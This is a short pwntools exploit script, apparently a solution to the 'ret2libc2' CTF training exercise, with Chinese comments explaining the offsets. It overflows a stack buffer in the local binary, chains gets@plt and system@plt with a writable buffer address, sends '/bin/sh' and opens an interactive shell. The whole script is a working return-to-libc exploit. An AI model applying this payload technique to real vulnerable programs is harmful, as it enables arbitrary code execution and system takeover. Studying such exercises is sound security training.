from pwn import *

sh = process("./ret2libc2")

offset = 0x6c
sys_plt = 0x08048490
get_plt = 0x08048460
buf2_add = 0x0804A080
#offset 0x6c是s到栈顶esp的距离
#0x4是ebp的长度,覆盖4字节的垃圾数据“b”,32位程序都是4个字节,64是8个
#sys_plt system函数地址
#get_plt get函数地址
#随意一个4字节数
#buf2_add buf2地址
payload = b"a"*offset + b"b"*0x4 + p32(get_plt) + p32(sys_plt) +  p32(buf2_add) +p32(buf2_add)

sh.sendline(payload)
sh.sendline('/bin/sh')

sh.interactive()
